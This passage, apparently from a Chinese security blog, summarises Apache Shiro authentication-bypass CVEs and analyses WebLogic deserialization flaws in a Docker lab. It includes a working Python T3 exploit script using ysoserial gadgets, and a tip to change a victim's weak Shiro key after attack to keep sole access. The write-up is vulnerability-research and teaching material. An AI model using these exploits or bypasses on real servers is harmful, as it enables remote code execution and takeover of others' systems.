<p>该类的作用是在SpringBoot项目启动之前自定义环境变量，可以在项目启动之前从非标准springboot配置文件中读取相关的配置并填充到springboot上下文中。中间有些跳步骤，建议还是自己多手调一下。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>CVE-2010-3863因为getRequestUri未标准化路径，可以使用<code>/./</code>进行绕过</li>
<li>CVE-2014-0074&#x2F;Shiro-460由于LDAP服务器开启匿名登录或未授权登录，导致可以使用空用户名搭配空密码或空用户名搭配任意密码</li>
<li>CVE-2016-4437&#x2F;Shiro-550就是著名的反序列化漏洞了</li>
<li>CVE-2016-6802因为getContextPath未标准化路径，可以使用<code>/../</code>进行绕过</li>
<li>CVE-2019-12422&#x2F;Shiro-721是对rememberMe功能加密方式的攻击</li>
<li>CVE-2020-1957&#x2F;Shiro-682是由于SpringWeb和Shiro处理方式不同，导致可以使用加路径末尾加斜杆或路径中加分号进行绕过</li>
<li>CVE-2020-11989&#x2F;Shiro-782是由于SpringWeb和Shiro处理方式不同，导致可以使用斜杆双编码或加分号进行绕过</li>
<li>CVE-2020-13933是由于SpringWeb和Shiro处理方式不同，导致可以使用分号编码进行绕过</li>
<li>CVE-2020-17510是由于SpringWeb和Shiro处理方式不同，导致可以使用点号编码进行绕过</li>
<li>CVE-2020-17523是由于SpringWeb和Shiro处理方式不同，导致可以使用空格编码进行绕过</li>
<li>CVE-2021-41303&#x2F;Shiro-825是由于新增逻辑的错误，导致可以绕过第一个需要认证的路径而访问第二个匿名路径</li>
<li>CVE-2022-32532是由于Shiro正则代表路径，且路径中含有<code>.</code>号，导致可以使用<code>%0d</code>或<code>%0a</code>进行绕过</li>
<li>CVE-2022-40664是由于Shiro在进行请求转发或包含时未进行鉴权导致绕过</li>
<li>CVE-2023-22602是由于SpringWeb和Shiro使用的路径处理模式不同，导致可以使用<code>/..</code>进行绕过</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><p><a href="https://javasec.org/java-vuls/shiro/Shiro-5.html">Shiro漏洞</a></p>
</li>
<li><p><a href="https://xz.aliyun.com/t/11633#toc-50">Shiro 历史漏洞分析</a></p>
</li>
<li><p><a href="https://juejin.cn/post/7154702383720136718">Shiro身份验证绕过——CVE-2022-40664</a></p>
</li>
<li><p><a href="https://www.zhangbj.com/p/1261.html">Spring Boot Controller 路径匹配规则</a></p>
</li>
<li><p><a href="https://forum.ezreal.cool/thread-111-1-1.html">CVE-2023-22602 漏洞分析</a></p>
</li>
<li><p>Shiro 组件的检测：检测站点是否包含 shiro 组件，cookie 关键字不是 rememberMe 等情况；</p>
</li>
<li><p>Shiro AES 弱密钥的检测：检测 Shiro 是否内置或配置了常见的弱密钥；</p>
</li>
<li><p>Shiro 内置链的利用：无 CC 依赖的 CB 链反序列化利用；</p>
</li>
<li><p>配合 RMI 利用：处理由于插入反序列化链导致的 Header 长度的问题，以及 Transformer 数组加载不到报错问题；</p>
</li>
<li><p>其他绕过 Tomcat Header 长度的姿势：反射修改 AbstractHttp11Protocol 的 maxHeaderSize、gzip + base64压缩编码、从外部或从 HTTP 请求 body 中加载类字节码；</p>
</li>
<li><p>Ysoserial 改造：由于 shiro RememberMe 反序列化流程中加载类方式不同导致需要对 ysoserial 中 CC 等链的改造；</p>
</li>
<li><p>组合攻击：在 weblogic&#x2F;Tomcat 等中间件上完成 shiro 的攻击、gadget 的利用、内存马的写入等组合操作；</p>
</li>
<li><p>改 Key：对于弱加密密钥，在攻击后将其修改，让目标仅为自己所用。</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>WebLogic全系漏洞分析截至20230609</title>
    <url>/2023/06/09/WebLogic/</url>
    <content><![CDATA[<h1 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Oracle融合中间件（Oracle Fusion Middleware）：Oracle融合中间件是一系列基于标准的软件产品，涵盖了一系列工具和服务：从Java EE和开发人员工具，到集成服务、身份管理、商业智能和协作。Oracle融合中间件为开发、部署和管理提供完整的支持。</p>
<p>概括成九个字就是，一堆软件产品和服务。</p>
<p>图示如下：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304191218669.gif" alt="Overview of Oracle Fusion Middleware"></p>
<p>可以从图看出，Web层级（Web Tier）有LBR、Oracle Web Cache、Oracle HTTP Server，Web层级通过MBeans访问中间件层级的资源，中间件层级有Applications等，其中<strong>Oracle WebLogic Server是核心</strong>，在数据层级中，有LDAP Server和Database，每个层级之间都使用防火墙隔离。</p>
<p>可以得出一个结论，Oracle融合中间件以WebLogic（简称）为核心，或者说Oracle融合中间件以WebLogic（简称）为基础。</p>
<p>WebLogic版本众多，但是现在我们经常见到的只有两个类别：10.x和12.x，这两个大版本也叫WebLogic Server 11g和WebLogic Server 12c。（现在已经出到14.x了）</p>
<p><strong>Oracle WebLogic Server 10.3.6支持的最低JDK版本为JDK1.6， Oracle WebLogic Server 12.1.3支持的最低JDK版本为JDK1.7，Oracle WebLogic Server 12.2.1及以上支持的最低JDK版本为JDK1.8</strong>。</p>
<p>简单记忆：</p>
<ul>
<li>10.3.6 - JDK1.6</li>
<li>12.1.3 - JDK1.7</li>
<li>12.2.1 - JDK1.8</li>
</ul>
<h3 id="WebLogic-域"><a href="#WebLogic-域" class="headerlink" title="WebLogic 域"></a>WebLogic 域</h3><p>WebLogic域由多个WebLogic服务器组成，其中必须要有一个管理者，该管理者叫做管理服务器，管理控制台部署在管理服务器上，管理服务器是域的中央控制器，负责分发配置，记录中央日志等工作。管理服务器要是停了，<strong>对域中被管理的服务器的运行没有影响</strong>。</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p>WebLogic服务器默认开放于7001端口，同时一个端口接收多种协议（HTTP、T3、IIOP等）的请求，按照不同的协议类型转发到不同的处理器进行处理。</p>
<p>对于WebLogic的Web系统上的详细设计，我没有在官网找到资料，估计是WebLogic不开源的原因。</p>
<h4 id="Oracle-Coherence"><a href="#Oracle-Coherence" class="headerlink" title="Oracle Coherence"></a>Oracle Coherence</h4><p>Oracle Coherence是一个独立的内存数据网格系统，它可以独立运行，也可以与其他服务器集成使用。</p>
<p>Coherence可以作为一个独立的服务器运行，并提供高度可伸缩的内存数据网格、分布式缓存和数据处理等功能，支持多种数据处理和缓存方案。此外，Coherence还提供了用于管理和监视Coherence集群的工具和API。</p>
<p>另外，Coherence也可以与其他服务器集成使用，例如WebLogic Server、IBM WebSphere、JBoss和Tomcat等。在这种情况下，Coherence通常作为一个嵌入式组件运行在这些服务器中，以提供高性能的内存数据缓存和处理功能。</p>
<p>总之，Coherence可以独立运行，也可以与其他服务器集成使用，具体取决于您的需求和应用场景。</p>
<p>WebLogic服务器默认不带有Oracle Coherence，Coherence是一个可选的组件，需要在WebLogic Server中进行安装和配置，才能开始使用Coherence。</p>
<h3 id="Back"><a href="#Back" class="headerlink" title="Back"></a>Back</h3><p>在<a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=93&product_id=14534&version_id=&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&month=0&cweid=0&order=1&trc=271&sha=bbe74ffeac9afcd64024038a2a865e469c359106">CVE list</a>中，CVE-2015-4852是个分水岭，因为在2010~2015这五年间未爆出任何WebLogic漏洞。</p>
<p>先看2015年前的：</p>
<table>
<thead>
<tr>
<th>CVE</th>
<th>描述</th>
<th>NVA分数</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://www.cvedetails.com/cve/CVE-2008-2576/">CVE-2008-2576</a></td>
<td>Oracle BEA Product Suite 9.2, 9.1, 9.0, and 8.1 SP6中的WebLogic Server组件存在不详的漏洞，其影响和本地攻击向量未知。</td>
<td>4.4</td>
</tr>
<tr>
<td><a href="https://www.cvedetails.com/cve/CVE-2008-2577/">CVE-2008-2577</a></td>
<td>Oracle BEA Product Suite 9.2 MP1中的WebLogic Server组件存在不详的漏洞，影响未知，并有远程验证的攻击向量。</td>
<td>4.6</td>
</tr>
<tr>
<td><a href="https://www.cvedetails.com/cve/CVE-2008-2578/"> CVE-2008-2578</a></td>
<td>Oracle BEA Product Suite 10.0和9.2 MP1中的WebLogic Server组件存在不详的漏洞，其影响和本地攻击向量未知。</td>
<td>4.3</td>
</tr>
<tr>
<td><a href="https://www.cvedetails.com/cve/CVE-2008-2579/">CVE-2008-2579</a></td>
<td>Oracle BEA Product Suite 10.0 MP1、9.2 MP3、9.1、9.0、8.1 SP6、7.0 SP7和6.1 SP7中的WebLogic Server Plugins for Apache、Sun和IIS Web服务器组件存在不明原因的漏洞，影响和远程攻击向量未知。</td>
<td>7.5</td>
</tr>
<tr>
<td><a href="https://www.cvedetails.com/cve/CVE-2008-3257/">CVE-2008-3257</a></td>
<td>Oracle WebLogic Server（原BEA WebLogic Server）10.3及以前版本中的Apache Connector（mod_wl）存在基于堆栈的缓冲区溢出，允许远程攻击者通过一个长的HTTP版本字符串执行任意代码，HTTP请求中 “POST &#x2F;.jsp “之后的字符串就是证明。</td>
<td>10.0</td>
</tr>
<tr>
<td><a href="https://www.cvedetails.com/cve/CVE-2010-0073/"> CVE-2010-0073</a></td>
<td>Oracle WebLogic Server 7.0 SP7、8.1 SP6、9.0、9.1、9.2 MP3、10.0 MP2和10.3.2中的WebLogic Server存在不明漏洞，允许远程攻击者通过未知攻击向量影响保密性、完整性和可用性。</td>
<td>10.0</td>
</tr>
<tr>
<td><a href="https://www.cvedetails.com/cve/CVE-2010-2375/">CVE-2010-2375</a></td>
<td>包&#x2F;权限：Apache、Sun和IIS网络服务器的插件 Oracle Fusion Middleware 7.0 SP7、8.1 SP6、9.0、9.1、9.2 MP3、10.0 MP2、10.3.2和10.3.3中的WebLogic Server组件存在特定漏洞，允许远程攻击者影响保密性和完整性，与IIS有关。</td>
<td>6.4</td>
</tr>
<tr>
<td><a href="https://www.cvedetails.com/cve/CVE-2010-4453/">CVE-2010-4453</a></td>
<td>Oracle Fusion Middleware 7.0.7、8.1.6、9.0、9.1、9.2.4、10.0.2、10.3.2和10.3.3中的Oracle WebLogic Server组件存在不明漏洞，允许远程攻击者通过与Servlet容器有关的未知攻击向量影响完整性。</td>
<td>4.3</td>
</tr>
</tbody></table>
<p>两个10.0评分的本质上都为堆栈溢出。有很多文章也并未提及2015年前的WebLogic漏洞，这8个漏洞对应的WebLogic版本久远，这些版本要求的jdk也比较低，现如今几乎没人会使用这么老的版本，所以漏洞复现和分析的意义并不是很大，所以就简单看一遍上面的描述过一遍即可。</p>
<p>然后就是分水岭CVE-2015-4852了，这个是利用T3协议的反序列化漏洞。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用的是<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">WeblogicEnvironment</a>靶场，在项目根路径下创建jdks目录和weblogics目录，将下载好的jdk和对应的weblogic，分别放到这两个目录。</p>
<blockquote>
<p>修改dockerfile文件，将FROM centos修改成FROM centos:centos7，同时注释掉RUN yum -y install libnsl</p>
<p>在#安装JDK所在行前添加如下内容：</p>
<p>RUN sed -i ‘s&#x2F;\r&#x2F;&#x2F;‘ &#x2F;scripts&#x2F;jdk_install.sh<br>RUN sed -i ‘s&#x2F;\r&#x2F;&#x2F;‘ &#x2F;scripts&#x2F;weblogic_install.sh<br>RUN sed -i ‘s&#x2F;\r&#x2F;&#x2F;‘ &#x2F;scripts&#x2F;create_domain.sh<br>RUN sed -i ‘s&#x2F;\r&#x2F;&#x2F;‘ &#x2F;scripts&#x2F;open_debug_mode.sh</p>
</blockquote>
<p>以Weblogic10.3.6配JDK 6u25为例，构建镜像命令如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">docker build --build-arg JDK_PKG=jdk-<span class="number">6</span>u25-linux-x64.bin --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk6u25 .</span><br></pre></td></tr></table></figure>

<p>镜像构建完成后，执行以下命令运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk6u25 weblogic1036jdk6u25</span><br></pre></td></tr></table></figure>

<p>8453为调试端口，7001为WebLogic管理控制台端口。</p>
<p>运行后可访问<code>http://localhost:7001/console/login/LoginForm.jsp</code>登录到Weblogic Server管理控制台，默认用户名为<code>weblogic</code>,默认密码为<code>qaxateam01</code>。</p>
<p>从容器获取调试目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp weblogic1036jdk6u25:/u01/app/oracle/middleware/modules .</span><br><span class="line">docker cp weblogic1036jdk6u25:/u01/app/oracle/middleware/wlserver .</span><br><span class="line">docker cp weblogic1036jdk6u25:/u01/app/oracle/middleware/coherence_3.7/lib ./lib</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>T3协议是WebLogic进行RMI通信的底层实现，WebLogic会按照T3协议所要求的数据格式进行组装数据包。T3协议是JRMP协议改进而来，T3协议的数据包有两个特点：</p>
<ol>
<li>前面四个字节，代表整个数据包的长度；</li>
<li>数据包中会带有多个序列化的java对象；</li>
</ol>
<p>它跟JRMP的区别在于：动态生成stub和skeleton。</p>
<p>所以说只要WebLogic使用了一些高危组件，存在利用链，就可以把数据包中序列化的java对象改成自己的恶意对象，从而造成RCE。</p>
<p>简化后的通信过程如下：</p>
<ol>
<li>与WebLogic服务器连接，商量使用的协议和版本号；</li>
<li>服务器返回支持的版本号；</li>
<li>客户端发送T3协议数据包；</li>
</ol>
<p>网上payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct <span class="comment"># 负责大小端的转换</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generatePayload</span>(<span class="params">gadget,cmd</span>):</span><br><span class="line">    YSO_PATH = <span class="string">&quot;E:\\tools\\java\\ysoserial-master-d367e379d9-1.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span><br><span class="line">    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    <span class="keyword">match</span> = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(<span class="keyword">match</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="comment">#return</span></span><br><span class="line">    header = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)</span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>)</span><br><span class="line">    payload = header + t3header  +desflag+  payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;touch /tmp/hack&quot;</span></span><br><span class="line">    payload = generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br></pre></td></tr></table></figure>

<p>这里直接将恶意序列化的对象直接放到第一位。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304211718839.png" alt="image-20230421171802249"></p>
<p>当收到客户端的连接后，进入ExecuteThread的run方法。这里向执行进程管理器去注册执行进程，然后使用当前进程作为执行进行去处理该请求。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304211721266.png" alt="image-20230421172137214"></p>
<p>执行数量加1，然后设置时间戳，接着调用SocketReaderRequest的execute方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304211723670.png" alt="image-20230421172322546"></p>
<p>然后处理套接字。后续步骤如下：</p>
<ol>
<li>识别协议类型，验证数据包格式等；</li>
<li>处理数据包头，判断数据包头所指示的数据包长度是否与实际的数据包长度相符；</li>
<li>处理待序列化对象；</li>
</ol>
<p>在InboundMsgAbbrev#readObject处理待序列化对象：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304211737088.png" alt="image-20230421173728025"></p>
<p>在read方法里，判断T3协议头后面是否还有内容，若还有内容，则var为0。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304211746927.png" alt="image-20230421174615845"></p>
<p>然后将MsgAbbrevInputStream封装为ServerChannelInputStream，同时调用ServerChannelInputStream的readObject方法。ServerChannelInputStream类实现了ObjectInputStream，具有处理对象输入流的能力，但是它并未重写readObject方法，所以ServerChannelInputStream未扩展读取输入流中的对象的功能，只能交由父类ObjectInputStream去读取。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304211748890.png" alt="image-20230421174811843"></p>
<p>它重写了resolveClass方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304211807076.png" alt="image-20230421180758011"></p>
<p>在resolveClass方法中，调用父类的resolveClass方法：父类的resolveClass方法中，通过Class的forName方法注册类。然后判断类是否与本地的SerialVersionUID相同。这里未做任何过滤的操作。这里的ObjectStreamClass是数据包中序列化对象的抽象，从流中读取的序列化对象的信息（包括类的描述信息、变量信息等）会封装到该类中。</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>在InboundMsgAbbrev#readObject方法中，调用readObject去反序列化恶意对象，触发恶意对象的readObject方法。这里由于WebLogic带了collections库从而可以使用CC链，配合CC链造成RCE。</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p><a href="https://pan.baidu.com/s/1hrGJNNI">补丁</a>来自RoboTerh师傅 ，安装步骤如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、新建cache_dir目录</span><br><span class="line">mkdir -p /u01/app/oracle/middleware/utils/bsu/cache_dir</span><br><span class="line">2、将压缩包上传到cache_dir目录，在宿主机下执行docker命令</span><br><span class="line">docker cp D:/BaiduNetdiskDownload/weblogic反序列化漏洞补丁.zip weblogic1036jdk6u25:/u01/app/oracle/middleware/utils/bsu/cache_dir</span><br><span class="line">3、解压</span><br><span class="line">cd /u01/app/oracle/middleware/utils/bsu/cache_dir</span><br><span class="line">unzip D:/BaiduNetdiskDownload/weblogic反序列化漏洞补丁.zip -d .</span><br><span class="line">unzip p20780171_1036_Generic.zip -d .</span><br><span class="line">4、调大内存参数</span><br><span class="line">cd ../</span><br><span class="line">vi ./bsu.sh</span><br><span class="line">-------</span><br><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">JAVA_HOME=&quot;/java&quot;</span><br><span class="line"></span><br><span class="line">MEM_ARGS=&quot;-Xms512m -Xmx1024m&quot; #调节该处</span><br><span class="line"></span><br><span class="line">&quot;$JAVA_HOME/bin/java&quot; $&#123;MEM_ARGS&#125; -jar patch-client.jar $*</span><br><span class="line"></span><br><span class="line">:wq</span><br><span class="line">-------</span><br><span class="line">5、安装补丁</span><br><span class="line">./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir  -patchlist=EJUW  -prod_dir=/u01/app/oracle/middleware/wlserver</span><br><span class="line">6、查看是否安装成功</span><br><span class="line">./bsu.sh -prod_dir=/u01/app/oracle/middleware/wlserver -status=applied -verbose -view</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304221235267.png" alt="image-20230422123554179"></p>
<p>然后再以同样的方式安装p22248开头的那个zip压缩包里的补丁。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304221245460.png" alt="image-20230422124506414"></p>
<p>然后重启一下docker容器。</p>
<p>重新使用payload攻击，服务器报以下错误：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304221704796.png" alt="image-20230422170403755"></p>
<p>重新复制lib包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp weblogic1036jdk6u25:/u01/app/oracle/middleware/modules .</span><br><span class="line">docker cp weblogic1036jdk6u25:/u01/app/oracle/middleware/wlserver .</span><br><span class="line">docker cp weblogic1036jdk6u25:/u01/app/oracle/middleware/coherence_3.7/lib ./lib</span><br></pre></td></tr></table></figure>

<p>打开IDEA进行调试：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304221711716.png" alt="image-20230422171148639"></p>
<p>在ServerChannelInputStream#resolveClass作类名检查。判断是否属于如下黑名单：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304221711533.png" alt="image-20230422171119437"></p>
<p>若属于，则抛出异常。</p>
<h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>以下两个CVE-2016-0638，CVE-2016-3510都使用<a href="https://github.com/5up3rc/weblogic_cmd">weblogic_cmd</a>项目进行复现。</p>
<h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>0638是对4852的绕过，用是黑名单没有的类StreamMessageImpl，绕过了ServerChannelInputStream的黑名单。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304221851562.png" alt="image-20230422185150475"></p>
<p>所以能成功调用到该类StreamMessageImpl的readExternal方法进行反序列化：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304221838864.png" alt="image-20230422183859802"></p>
<p>而在它的readExternal中，自己创建了个新的ObjectInputStream，然后从该ObjectInputStream中读取序列化对象，进行反序列化。如上图<code>var5.readObject()</code>就是反序列化恶意对象。因为原生的ObjectInputStream并未过滤恶意对象，所以绕过4852的ServerChannelInputStream的黑名单。</p>
<p>现在看他如何包装对象输入流的：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304221848801.png" alt="image-20230422184819755"></p>
<p>首先调用createPayload方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304221854669.png" alt="image-20230422185434596"></p>
<p>这里的CHUNK_LINK_THRESHOLD属性是36720大于读取的1407，所以不走if块，然后调用copyPayloadFromStream方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304221856356.png" alt="image-20230422185627282"></p>
<p>这里先介绍一下chunk，chunk是 WebLogic Server 网络层（客户端和服务器端）用于从套接字读取数据和向套接字写入数据的内存单元。上面的代码讲的是，从输入流读取的块的长度1407（var2）要是比两个内存单元的长度8160（<code>Chunk.CHUNK_SIZE * 2</code>）的小，就以输入流读取的块的长度1407为准，创建一个1407大小的共享内存单元，然后将输入流var0中的数据复制到该共享内存单元中，也就是var3中，然后将var3作为PayloadChunkBase的chunk属性的值。</p>
<p>回到readExternal方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304221903729.png" alt="image-20230422190332668"></p>
<p>第一步走完，将PayloadChunkBase类实例赋给payload属性，第二步从payload中获取输入流，输入流中的数据就是chunk属性的值。然后将输入流包装成对象输入流。</p>
<p>所以说它仅仅是将原来输入流中的数据复制到一个新的输入流而已。</p>
<p>所以我们只要将序列化的对象设置为StreamMessageImpl类实例，然后将恶意对象序列化的字节到StreamMessageImpl类实例字节码的后面即可。</p>
<p>在readExternal方法中，先读取一个字节readByte，字节值为1才能进入case 1的switch语句中，然后createPayload中，又读取一个int(readInt)，这个int值就是恶意对象字节码的长度，然后剩下的部分就是恶意对象序列化后的字节码了。格式如下：</p>
<table>
<thead>
<tr>
<th>ac ed 00 05</th>
<th>StreamMessageImpl</th>
<th>01</th>
<th>恶意对象字节码的长度</th>
<th>恶意对象字节码</th>
</tr>
</thead>
</table>
<p>怎么构造攻击payload？</p>
<ol>
<li>从jar包中提取出StreamMessageImpl类，然后修改它的writeExternal方法，writeExternal方法写入的数据和readExternal读取的数据保持一致。</li>
<li>序列化StreamMessageImpl，获取字节码。</li>
<li>抓取T3协议包，修改任意一个序列化对象的字节码为我们的StreamMessageImpl的字节码，并重新计算整个包的长度，然后将包头的长度替换成新的长度。</li>
</ol>
<h2 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>该漏洞和0638相同，同样找的是绕过黑名单的类，同时该类能触发二次反序列化。</p>
<p>而这次使用的是MarshalledObject类，由于它自身并没有实现readObject方法，所以我们跟一下流程，从 InboundMsgAbbrev#readObject开始：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304231212970.png" alt="image-20230423121229079"></p>
<p>这里开始反序列化MarshalledObject类，由ObjectInputStream操刀（之前说过ServerChannelInputStream继承ObjectInputStream且并未重写readObject方法，所以调用ObjectInputStream的readObject方法）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304231224961.png" alt="image-20230423122409894"></p>
<p>不允许覆盖，进入else语句，调用readObject0方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304231349076.png" alt="image-20230423134947015"></p>
<p>标志位为115，则读取原始对象readOrdinaryObject()。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304231728588.png" alt="image-20230423172828368"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304231730561.png" alt="image-20230423173051497"></p>
<p>ObjectStreamClass类是输入流中的序列化对象的抽象表示。然后调用invokeReadResolve方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304231732133.png" alt="image-20230423173209089"></p>
<p>反射调用MarshalledObject的readResolve方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304231733412.png" alt="image-20230423173346358"></p>
<p>在readResolve方法里，新建了ObjectInputStream，同时对象输入流中的数据来源于objBytes属性的值，最后使用ObjectInputStream的readObject方法从流中读取对象。完成二次反序列化，所以可以将恶意对象封装到objBytes属性中，即可触发攻击。</p>
<p>而该属性赋值十分简单，只需要new一个MarshalledObject时，传递一个对象即可，他就会将该对象转成字节数组并赋给objBytes属性：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304231737203.png" alt="image-20230423173701142"></p>
<h2 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>使用<a href="https://github.com/BabyTeam1024/CVE-2017-3248">CVE-2017-3248</a>作为payload~</p>
<p>这个漏洞会使用底层JRMP向指定的JRMP服务端发起一个连接，而我们可以伪造一个服务端，向客户端返回一个恶意对象，客户端收到这个恶意对象后反序列化造成命令执行。</p>
<p>这个同样找的是绕过黑名单的类，不过这次不是二次反序列化，而是一次反序列化后发起JRMP请求。</p>
<p>这次封装的类为代理类，它的InvocationHandler实现为RemoteObjectInvocationHandler，该类处理远程对象的调用，反序列化代理类时，会先反序列化RemoteObjectInvocationHandler，但是它并没有实现readObject方法，而它的父类RemoteObject实现了该方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304241928108.png" alt="image-20230424192827874"></p>
